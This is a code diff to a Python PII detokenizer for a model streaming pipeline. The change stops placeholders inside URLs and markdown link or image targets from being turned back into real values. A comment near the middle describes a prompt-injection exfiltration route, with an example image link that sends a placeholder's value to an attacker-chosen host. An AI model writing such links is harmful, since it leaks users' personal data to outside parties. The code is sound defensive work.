@@ -7,6 +7,7 @@ side; `StreamDetokenizer` aligns and reverses a stream one request reads and wri
 `detokenize_json` reverses every string of an event's data.
 """
 
+import json
 import logging
 import re
 from collections.abc import Sequence
@@ -22,6 +23,11 @@ PLACEHOLDER_MAX_CHARS = 16
 _OPEN_PLACEHOLDER = re.compile(r"<(?:<(?:P(?:I(?:I(?:_(?:\d{1,8}>?)?)?)?)?)?)?")
 
 log = logging.getLogger(__name__)
+
+
+class RevealUnavailable(RuntimeError):
+    """The token store could not be read at the exit (C17, r1 MINOR-11): the reader's stream ends
+    with an error event instead of breaking without one or showing placeholders silently."""
 
 
 class TokenScopeMissing(ValueError):
@@ -252,21 +258,81 @@ class PlaceholderAligner:
         return held
 
 
+# r1 MAJOR-3 (KARARLAR "C17 geri çevirme bağlam istisnası", A): a placeholder inside a URL or
+# a markdown link/image target is not reversed. An upstream (external agent, provider, injected
+# instruction) could write `![x](https://its-host/?q=<<PII_1>>)`, and a client that loads images
+# would send the value to that host. Contexts run up to the next whitespace: a markdown target
+# `](...`, an `href=...` attribute value, a bare `scheme://...`.
+_URL_CONTEXT = re.compile(r"\]\(\S*|\bhref\s*=\s*\S*|\b[a-z][a-z0-9+.-]*://\S*", re.IGNORECASE)
+# How much of the text before a chunk a stream keeps to see a URL that began earlier: the text
+# after the last whitespace, at most this long (a longer URL loses its start: a known limit).
+URL_CONTEXT_MAX_CHARS = 8192
+
+
+def _url_spans(text: str) -> list[tuple[int, int]]:
+    return [m.span() for m in _URL_CONTEXT.finditer(text)]
+
+
+def _context_tail(text: str) -> str:
+    cut = max(text.rfind(c) for c in " \t\n\r")
+    return text[cut + 1 :][-URL_CONTEXT_MAX_CHARS:]
+
+
+async def reveal_text(
+    text: str, *, store: TokenStore, scope: str, context: str = "", json_escape: bool = False
+) -> tuple[str, int, int]:
+    """(text with this scope's placeholders turned back into values, unresolved count, kept in a
+    URL count). `context` is the text that came just before in the same stream, so a URL that
+    began in an earlier chunk is seen. `json_escape` writes each value as it must appear inside
+    a JSON string (tool call arguments, r1 MINOR-3)."""
+    if "<<PII_" not in text:
+        return text, 0, 0
+    whole = context + text
+    spans = _url_spans(whole)
+    shift = len(context)
+    out, cursor, unresolved, skipped = [], 0, 0, 0
+    for match in PLACEHOLDER.finditer(text):
+        start, end = match.start() + shift, match.end() + shift
+        out.append(text[cursor : match.start()])
+        cursor = match.end()
+        if any(a <= start and end <= b for a, b in spans):
+            skipped += 1
+            out.append(match.group(0))
+            continue
+        value = await store.lookup(scope, match.group(0))
+        if value is None:
+            unresolved += 1
+            out.append(match.group(0))
+        else:
+            out.append(json.dumps(value, ensure_ascii=False)[1:-1] if json_escape else value)
+    out.append(text[cursor:])
+    return "".join(out), unresolved, skipped
+
+
 class StreamDetokenizer:
     """Aligner + reversal for a stream one request writes and reads (the facade's direct model
-    path): no chunk it returns contains a placeholder the scope issued, split or whole.
-    `unresolved` counts placeholders the scope never issued (left as they are)."""
+    path): no chunk it returns contains a placeholder the scope issued, split or whole, except
+    inside a URL (kept, `skipped_url`). `unresolved` counts placeholders the scope never issued
+    (left as they are)."""
 
-    def __init__(self, store: TokenStore, scope: str) -> None:
-        self._store, self._scope = store, scope
+    def __init__(self, store: TokenStore, scope: str, *, json_escape: bool = False) -> None:
+        self._store, self._scope, self._json = store, scope, json_escape
         self._aligner = PlaceholderAligner()
+        self._context = ""
         self.unresolved = 0
+        self.skipped_url = 0
 
     async def _reverse(self, text: str) -> str:
-        if "<<PII_" not in text:
-            return text
-        out, unresolved = await detokenize(text, store=self._store, scope=self._scope)
-        self.unresolved += len(unresolved)
+        out, unresolved, skipped = await reveal_text(
+            text,
+            store=self._store,
+            scope=self._scope,
+            context=self._context,
+            json_escape=self._json,
+        )
+        self._context = _context_tail(self._context + text)
+        self.unresolved += unresolved
+        self.skipped_url += skipped
         return out
 
     async def feed(self, text: str) -> str:
@@ -276,21 +342,55 @@ class StreamDetokenizer:
         return await self._reverse(self._aligner.flush())
 
 
-async def detokenize_json(data: Any, *, store: TokenStore, scope: str) -> tuple[Any, int]:
-    """(a copy of `data` with every string reversed within `scope`, placeholders left as they
-    are because the scope never issued them or its mapping expired)."""
+class ContextReveal:
+    """Reversal of a run's event data (C17), one reader: strings within the scope; the `token`
+    events of a live stream share a context, so a URL split over two entries is seen."""
+
+    def __init__(self, store: TokenStore, scope: str) -> None:
+        self._store, self._scope = store, scope
+        self._context = ""
+        self.unresolved = 0
+        self.skipped_url = 0
+
+    async def data(self, data: Any, *, stream_text: bool = False) -> Any:
+        if stream_text and isinstance(data, dict) and isinstance(data.get("text"), str):
+            text, unresolved, skipped = await reveal_text(
+                data["text"], store=self._store, scope=self._scope, context=self._context
+            )
+            self._context = _context_tail(self._context + data["text"])
+            self.unresolved += unresolved
+            self.skipped_url += skipped
+            return {**data, "text": text}
+        out, unresolved, skipped = await detokenize_json(data, store=self._store, scope=self._scope)
+        self.unresolved += unresolved
+        self.skipped_url += skipped
+        return out
+
+
+async def detokenize_json(data: Any, *, store: TokenStore, scope: str) -> tuple[Any, int, int]:
+    """(a copy of `data` with every string reversed within `scope`, unresolved count, kept in a
+    URL count): placeholders stay where the scope never issued them, the mapping expired or
+    they sit in a URL."""
     if isinstance(data, str):
-        if "<<PII_" not in data:
-            return data, 0
-        out, unresolved = await detokenize(data, store=store, scope=scope)
-        return out, len(unresolved)
+        return await reveal_text(data, store=store, scope=scope)
     if isinstance(data, list):
         items = [await detokenize_json(v, store=store, scope=scope) for v in data]
-        return [v for v, _ in items], sum(n for _, n in items)
+        return [v for v, _, _ in items], sum(i[1] for i in items), sum(i[2] for i in items)
     if isinstance(data, dict):
         pairs = {k: await detokenize_json(v, store=store, scope=scope) for k, v in data.items()}
-        return {k: v for k, (v, _) in pairs.items()}, sum(n for _, n in pairs.values())
-    return data, 0
+        return (
+            {k: v for k, (v, _, _) in pairs.items()},
+            sum(i[1] for i in pairs.values()),
+            sum(i[2] for i in pairs.values()),
+        )
+    return data, 0, 0
+
+
+def log_skipped_url(scope: str, count: int) -> None:
+    """r1 MAJOR-3: placeholders kept because they sit in a URL; scope and count, never a
+    value."""
+    if count:
+        log.info("detokenize_skipped_url scope=%s count=%d", scope, count)
 
 
 def log_unresolved(scope: str, count: int) -> None:
